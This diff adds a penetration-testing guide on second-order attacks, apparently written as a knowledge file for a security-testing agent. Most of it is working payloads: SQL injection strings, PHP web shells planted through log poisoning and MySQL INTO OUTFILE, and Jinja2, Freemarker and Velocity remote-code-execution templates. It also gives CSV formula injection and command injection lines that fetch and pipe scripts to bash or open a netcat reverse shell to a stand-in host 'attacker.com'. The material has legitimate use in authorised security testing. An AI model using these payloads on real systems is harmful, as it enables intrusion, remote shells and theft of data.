@@ -1,0 +1,324 @@
+<second_order_attacks_guide>
+<title>SECOND-ORDER ATTACKS</title>
+
+<critical>Second-order attacks occur when malicious input is stored, then later retrieved and executed in a different context. These delayed exploitation techniques are often missed by traditional testing as the injection point and execution point are separated. Testing must trace data flow from storage to execution contexts.</critical>
+
+<scope>
+- Second-order SQL injection
+- Stored XSS via file imports (CSV, XML, Excel)
+- Delayed command execution
+- Log poisoning attacks
+- Database-triggered payloads
+- Import/export functionality abuse
+- Scheduled task injection
+- Template injection via stored data
+</scope>
+
+<methodology>
+1. Identify data storage points accepting user input.
+2. Inject payloads into storage without immediate execution.
+3. Trace where stored data is later retrieved and processed.
+4. Trigger execution context (admin views, automated processes, exports).
+5. Verify delayed exploitation occurs.
+</methodology>
+
+<second_order_sqli>
+{% raw %}
+# Second-order SQL injection:
+
+# Step 1: Inject payload into database
+POST /register
+{"username": "admin'--", "password": "password123"}
+# Stored in database, sanitized on insert
+
+# Step 2: Later retrieved unsafely in different context
+# Administrator search functionality:
+SELECT * FROM audit_logs WHERE username = 'admin'--'
+# Injected username terminates query early
+
+# Example chain:
+# Registration: username = "' OR '1'='1"
+# Stored safely with escaping
+
+# Later in email functionality:
+$query = "SELECT * FROM users WHERE username = '$username'";
+# Retrieved username used unsafely
+
+# Testing approach:
+# 1. Register user: admin' UNION SELECT password FROM admins--
+# 2. Trigger context using this username
+# 3. Check for SQL injection execution
+
+# Common second-order contexts:
+# - Search queries using stored usernames
+# - Email generation with stored names
+# - Report generation
+# - Admin audit logs
+# - Backup/export functions
+{% endraw %}
+</second_order_sqli>
+
+<stored_xss_imports>
+{% raw %}
+# XSS via CSV/Excel import:
+
+# Step 1: Upload CSV with payload
+# CSV content:
+name,email,comment
+John Doe,john@example.com,=cmd|'/c powershell IEX(wget attacker.com/s)'
+Alice,alice@example.com,<script>alert(document.cookie)</script>
+
+# Step 2: Admin imports CSV
+POST /admin/import-users
+Content-Type: multipart/form-data
+[CSV file upload]
+
+# Step 3: Admin views imported data in browser
+# XSS executes in admin context
+
+# Excel formula injection:
+=cmd|'/c calc'
+=HYPERLINK("http://attacker.com?c="&A1&A2,"Error")
+@SUM(1+1)*cmd|'/c calc'
+
+# XML import XSS:
+<user>
+  <name><![CDATA[<script>alert(1)</script>]]></name>
+  <bio><?xml-stylesheet href="http://attacker.com/xss.xsl"?></bio>
+</user>
+
+# JSON import:
+{
+  "users": [
+    {"name": "<img src=x onerror=alert(1)>", "email": "test@test.com"}
+  ]
+}
+{% endraw %}
+</stored_xss_imports>
+
+<log_poisoning>
+{% raw %}
+# Log poisoning attacks:
+
+# Step 1: Inject malicious data into logs
+# Via User-Agent:
+curl -H "User-Agent: <?php system($_GET['cmd']); ?>" http://example.com/
+
+# Via authentication attempts:
+POST /login
+{"username": "<?php system($_GET['cmd']); ?>", "password": "test"}
+
+# Step 2: Log file written to web-accessible location
+# /var/log/apache/access.log or /var/www/logs/access.log
+
+# Step 3: Include log file via LFI
+GET /page?file=../../var/log/apache/access.log&cmd=id
+
+# SSH log poisoning:
+ssh '<?php system($_GET["cmd"]); ?>'@target.com
+# Failed login logged to /var/log/auth.log
+
+# Access via LFI:
+GET /read?file=/var/log/auth.log&cmd=whoami
+
+# Mail log poisoning:
+telnet example.com 25
+MAIL FROM:<<?php system($_GET['c']); ?>@example.com>
+{% endraw %}
+</log_poisoning>
+
+<delayed_command_execution>
+{% raw %}
+# Delayed command execution:
+
+# Scenario: Batch job processes user input
+# Step 1: Submit command injection payload
+POST /api/report-request
+{"report_type": "sales", "email": "user@example.com; wget attacker.com/shell.sh"}
+
+# Step 2: Cron job runs nightly
+# Script processes report_request table:
+#!/bin/bash
+EMAIL=$(SELECT email FROM report_request WHERE id=1)
+send_report $EMAIL
+# Command injection triggers during batch processing
+
+# Testing:
+# 1. Submit payload in various input fields
+# 2. Monitor for delayed execution (check logs, network traffic)
+# 3. May need to wait hours/days for scheduled task
+
+# Scheduled task injection:
+POST /api/create-task
+{"name": "backup", "schedule": "0 0 * * *; curl attacker.com/callback"}
+
+# Process queue injection:
+POST /api/queue-job
+{"job": "resize_image", "params": "-resize 100x100; wget http://attacker.com/s | bash"}
+{% endraw %}
+</delayed_command_execution>
+
+<database_triggers>
+{% raw %}
+# Database-triggered payloads:
+
+# SQL Server xp_cmdshell via trigger:
+# Step 1: Create malicious data
+INSERT INTO comments VALUES ('normal comment');
+
+# Step 2: Trigger uses data unsafely
+CREATE TRIGGER evil_trigger ON comments
+AFTER INSERT AS
+BEGIN
+  DECLARE @cmd VARCHAR(255)
+  SELECT @cmd = comment FROM inserted
+  EXEC xp_cmdshell @cmd
+END
+
+# PostgreSQL copy to program:
+COPY (SELECT 'payload') TO PROGRAM 'curl attacker.com';
+
+# MySQL into outfile:
+SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
+
+# Stored procedure injection:
+CREATE PROCEDURE process_order(@email VARCHAR(255))
+AS
+BEGIN
+  EXEC('SELECT * FROM orders WHERE email = ''' + @email + '''')
+END
+# Called later with injected email value
+{% endraw %}
+</database_triggers>
+
+<import_export_abuse>
+{% raw %}
+# Import/export second-order attacks:
+
+# Data export injection:
+# Step 1: Store malicious filename
+POST /api/files
+{"filename": "../../../etc/passwd", "content": "data"}
+
+# Step 2: Admin exports files
+GET /admin/export-files
+# Creates archive with path traversal
+
+# Step 3: Extract archive
+unzip export.zip
+# Overwrites /etc/passwd
+
+# Template injection via export:
+# Step 1: Store template syntax
+POST /api/products
+{"name": "{{7*7}}", "description": "test"}
+
+# Step 2: Generate PDF report
+GET /admin/reports/products.pdf
+# Template engine processes stored data
+# Results in: Name: 49
+
+# SSTI payload:
+{"name": "{{config.items()}}"}
+{"name": "{{''.__class__.__mro__[1].__subclasses__()}}"}
+{% endraw %}
+</import_export_abuse>
+
+<template_injection_stored>
+{% raw %}
+# Server-Side Template Injection via stored data:
+
+# Step 1: Store SSTI payload in profile
+PUT /api/user/profile
+{"bio": "{{7*7}}", "name": "Test User"}
+
+# Step 2: Admin generates user report
+GET /admin/users/report
+# Template renders stored bio
+# Output: 49 (indicates SSTI)
+
+# Escalate to RCE:
+PUT /api/user/profile
+{"bio": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"}
+
+# Jinja2 RCE:
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Freemarker RCE:
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
+
+# Velocity RCE:
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$rt.getRuntime().exec('id')
+{% endraw %}
+</template_injection_stored>
+
+<common_payloads>
+{% raw %}
+# Second-order SQLi:
+admin'--
+' OR '1'='1
+' UNION SELECT password FROM users--
+
+# CSV/Excel injection:
+=cmd|'/c calc'
+=HYPERLINK("http://attacker.com","click")
+@SUM(1+1)*cmd|'/c powershell IEX(wget attacker.com/s)'
+
+# Log poisoning:
+<?php system($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+
+# SSTI payloads:
+{{7*7}}
+{{config}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+
+# Command injection in delayed context:
+; wget http://attacker.com/shell | bash
+`curl http://attacker.com/callback`
+$(nc attacker.com 4444 -e /bin/sh)
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate injection at storage point.
+2. Show execution occurs in different context/time.
+3. Prove payload survived storage and was executed.
+4. Document the trigger that causes execution.
+5. Provide timeline showing delayed exploitation.
+</validation>
+
+<false_positives>
+- Input sanitization at both storage and retrieval
+- Context-appropriate output encoding
+- Parameterized queries at all data access points
+- Content Security Policy preventing stored XSS
+- Sandboxed import/export processing
+- Log files not in web-accessible locations
+</false_positives>
+
+<impact>
+- SQL injection in privileged contexts (admin queries)
+- XSS executing in administrator sessions
+- Remote Code Execution via log poisoning
+- CSV injection leading to client-side code execution
+- Template injection resulting in server compromise
+- Privilege escalation through delayed payload execution
+- Data exfiltration via database triggers
+</impact>
+
+<pro_tips>
+1. Test both injection point and all retrieval points separately.
+2. Trace complete data flow from storage to usage.
+3. Focus on admin interfaces that display user data.
+4. Test import/export features with malicious files.
+5. Check log files for injection opportunities.
+6. Look for template engines processing user data.
+7. Test scheduled tasks and batch processors.
+8. Consider time delay - may need to wait for execution.
+9. Database triggers and stored procedures are key targets.
+10. CSV/Excel formula injection often overlooked by developers.
+</pro_tips>
+
+<remember>Second-order attacks separate injection from execution, making them harder to detect. Key scenarios: SQL injection stored then used in different query, XSS via CSV import, log poisoning for LFI->RCE, template injection via stored user data, command injection in scheduled tasks. Always trace data from storage through all retrieval contexts. Admin interfaces often trigger second-order vulnerabilities when displaying user content. Import/export features are prime targets for delayed exploitation.</remember>
+</second_order_attacks_guide>
